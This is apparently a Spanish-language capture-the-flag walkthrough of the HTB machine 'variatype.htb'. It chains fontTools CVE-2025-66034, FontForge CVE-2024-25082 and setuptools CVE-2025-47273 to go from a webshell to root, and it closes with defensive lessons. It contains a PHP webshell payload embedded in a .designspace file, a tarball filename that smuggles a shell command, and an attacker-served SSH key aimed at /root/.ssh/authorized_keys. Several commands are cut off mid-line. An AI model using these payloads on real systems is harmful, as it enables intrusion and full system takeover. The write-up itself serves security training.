❯ whatweb http://variatype.htb

El sitio principal es una aplicación Flask llamada VariaType Labs — Variable Font Generator. Permite subir archivos .designspace (XML) junto con fuentes .ttf para generar fuentes variables mediante fontTools.varLib. El endpoint clave es /tools/variable-font-generator/process.

Probamos la funcionalidad generando fuentes maestras y un .designspace de prueba con Python:

import os
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def crear_fuente_maestra(nombre_archivo, grosor_linea):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    fb.setupNameTable({
        'familyName': 'EjemploVariable',
        'styleName': nombre_archivo.split('-')[1].replace('.ttf', ''),
        'uniqueFontIdentifier': f'EjemploVariable-{nombre_archivo}:2026',
        'fullName': f'EjemploVariable {nombre_archivo}',
        'version': 'Version 1.000',
    })
    pen = TTGlyphPen(None)
    pen.moveTo((100, 0))
    pen.lineTo((500, 800))
    pen.lineTo((900, 0))
    pen.lineTo((900 - grosor_linea, 0))
    pen.lineTo((500, 800 - grosor_linea))
    pen.lineTo((100 + grosor_linea, 0))
    pen.closePath()
    pen.moveTo((300, 300))
    pen.lineTo((700, 300))
    pen.lineTo((700, 300 + grosor_linea))
    pen.lineTo((300, 300 + grosor_linea))
    pen.closePath()
    glyph = pen.glyph()
    pen_notdef = TTGlyphPen(None)
    glyph_notdef = pen_notdef.glyph()
    glyphs = {'.notdef': glyph_notdef, 'A': glyph}
    fb.setupGlyf(glyphs)
    orden_glifos = ['.notdef', 'A']
    fb.setupGlyphOrder(orden_glifos)
    metrics = {'.notdef': (500, 0), 'A': (1000, 100)}
    fb.setupHorizontalMetrics(metrics)
    fb.setupCharacterMap({0x41: 'A'})
    fb.setupPost()
    fb.save(nombre_archivo)
    print(f"[+] Fuente creada: {nombre_archivo}")

CVE-2025-66034 — Arbitrary File Write en fontTools Link to heading

Ahora que conocemos la arquitectura, atacamos la aplicacion Flask en variatype.htb. El endpoint /tools/variable-font-generator/process usa fontTools.varLib para procesar archivos .designspace. Es vulnerable a CVE-2025-66034 por dos razones:

  1. El atributo filename en la etiqueta <variable-font> permite rutas absolutas, y os.path.join() descarta el directorio base si el segundo argumento es absoluto, permitiendo arbitrary file write.
  2. La etiqueta <labelname> con secciones CDATA permite inyectar contenido PHP dentro del archivo de salida.

Creamos un .designspace malicioso que combina ambas vulnerabilidades para escribir una webshell PHP en el directorio publico del portal:

<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[
0xdf output: <?php echo shell_exec($_REQUEST["cmd"]);?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">MEOW2</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="Master-Regular.ttf" name="Light">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MaliciousFont" filename="/var/www/portal.variatype.htb/public/pwned.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>

Subimos el .designspace junto con los .ttf al endpoint de Flask. El servidor procesa el XML y escribe el archivo pwned.php en la raiz del portal con la inyeccion PHP incrustada en los metadatos de la fuente. Como PHP ejecuta cualquier etiqueta <?php ... ?> incluso dentro de binario, la webshell funciona:

set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "

Si el nombre del archivo contiene caracteres como ;, se inyectan en el codigo Python que FontForge ejecuta.

CVE-2024-25082 — Command Injection via filename en FontForge Link to heading

FontForge 20230101 es vulnerable a CVE-2024-25082: inyeccion de comandos a traves del nombre de archivo. Creamos un tarball con un nombre malicioso que, al ser expandido en el codigo Python de FontForge, ejecuta comandos arbitrarios:

import tarfile, io

malicious_name = "exploit.ttf;bash /tmp/privesc/s.sh;"
tar = tarfile.open("exploit.tar", "w")
info = tarfile.TarInfo(name=malicious_name)
info.size = 4
tar.addfile(info, io.BytesIO(b"AAAA"))
tar.close()

El script s.sh agrega nuestra clave SSH a steve:

www-data@variatype:/tmp$ mv exploit.tar /var/www/portal.variatype.htb/public/files/.

Escalada a root via CVE-2025-47273 Link to heading

Revisamos privilegios de sudo:

steve@variatype:~$ sudo -l
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *

Podemos ejecutar install_validator.py como root con cualquier argumento. Este script descarga un “plugin” desde una URL usando PackageIndex.download() de setuptools y lo escribe en disco. La version de setuptools (78.1.0) es vulnerable a CVE-2025-47273: path traversal mediante %2f en la URL, que permite escribir archivos en cualquier ubicacion del sistema.

Servimos nuestra clave SSH desde nuestra maquina atacante:

from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGEsTWa2oyF51xPMwnUExR6ZrGeUvj8auBUn1AyOVB7o kali@kali\n")

HTTPServer(("0.0.0.0", 80), Handler).serve_forever()

Ejecutamos el script con sudo, usando %2f (equivalente a / URL-encoded) para escribir directamente en /root/.ssh/authorized_keys:

steve@variatype:/opt/font-tools$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \

Lecciones aprendidas Link to heading

  1. No exponer .git en produccion. Las credenciales eliminadas con un nuevo commit siguen accesibles via git fsck y commits huerfanos.
  2. Dos aplicaciones, dos vectores. La maquina tiene una app Flask (font generator) y un portal PHP separados. La vulnerabilidad en Flask permitio escribir en el directorio del portal PHP.
  3. Cuidado con las sustituciones de variables en scripts. La variable $file expandida directamente en un string Python dentro de FontForge permitio inyeccion de comandos.
  4. Wildcards en sudo son peligrosos. install_validator.py * permite pasar rutas arbitrarias, y combinado con PackageIndex.download() vulnerable a path traversal, da acceso root.
  5. os.path.join() con rutas absolutas: si el segundo argumento es absoluto, descarta el primero. fontTools confiaba en esto para restringir el directorio de salida, pero el atacante especifico una ruta absoluta en el XML.
